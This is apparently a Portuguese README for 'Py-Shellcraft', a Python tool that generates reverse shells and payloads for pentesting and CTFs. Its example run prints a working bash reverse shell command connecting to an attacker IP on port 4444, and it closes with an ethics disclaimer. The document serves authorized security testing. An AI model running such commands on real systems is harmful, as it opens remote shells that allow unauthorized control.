# 🐚 Py-Shellcraft — Gerador de Reverse Shells & Payloads

<div align="center">

[![Python](https://img.shields.io/badge/Python-3.8%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey?style=for-the-badge)](https://github.com/zGordola1)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](./LICENSE)
[![Focus](https://img.shields.io/badge/Category-Red%20Team%20%7C%20CTF%20Toolkit-red?style=for-the-badge)](https://github.com/zGordola1)

</div>

---

## 📌 Visão Geral

O **Py-Shellcraft** (Canivete de Shells) é uma ferramenta interativa em linha de comando desenvolvida em Python para geração rápida, modular e automatizada de **Reverse Shells e Payloads** voltados para testes de penetração (Pentest), pós-exploração e resolução de CTFs (TryHackMe, HackTheBox).

---

## ⚡ Funcionalidades

- 🔍 **Auto-Detecção de Interfaces de Rede:** Identifica automaticamente os IPs ativos na máquina local (Ethernet, Wi-Fi, VPNs como Tun0/Tailscale).
- 🛡️ **Validação e Sanitização:** Validação estrita de endereços IP (`ipaddress`) e portas (1-65535).
- 📋 **Integração com Clipboard:** Cópia automática com um clique do payload gerado para a área de transferência do sistema operacional.
- 💾 **Persistência em Arquivo:** Salva todos os payloads formatados em arquivo de saída (`payloads_gerados.txt`).
- 🎨 **Interface ANSI:** Terminal estilizado com códigos de cores ANSI nativos para fácil visualização.
- 📦 **Dezenas de Payloads Suportados:**
  - `bash`, `python`, `php`, `nc`, `powershell`, `perl`, `socat`, `ruby`, `go`, `rust`, `nodejs` e muito mais.

---

## 🚀 Como Usar

### 1. Instalação das Dependências

```bash
git clone https://github.com/zGordola1/py-shellcraft.git
cd py-shellcraft
pip install -r requirements.txt
```

### 2. Execução Interativa

```bash
python shellcraft.py
```

---

## 💻 Exemplo de Execução

```text
===================================
   CANIVETE REVERSE SHELL (v2.0)   
===================================

[*] IPs de rede detectados: 192.168.33.111, 100.78.32.55
Digite o IP do atacante [Enter para 192.168.33.111]: 
Digite a porta do atacante [Enter para 4444]: 

[+] Todos os payloads salvos com sucesso no arquivo 'payloads_gerados.txt'!
[*] Total de payloads disponíveis: 50+

Digite o nome do payload desejado (ex: bash, python, nc) ou [Enter] para listar todos: bash

# bash
bash -i >& /dev/tcp/192.168.33.111/4444 0>&1

[+] Payload copiado para a área de transferência! (Ctrl + V)
```

---

## ⚠️ Disclaimer de Ética

Esta ferramenta foi desenvolvida exclusivamente para **fins educacionais, simulações de segurança defensiva/ofensiva autorizadas e desafios em ambientes controlados (CTFs)**. O desenvolvedor não apoia nem se responsabiliza pelo uso indevido deste software.
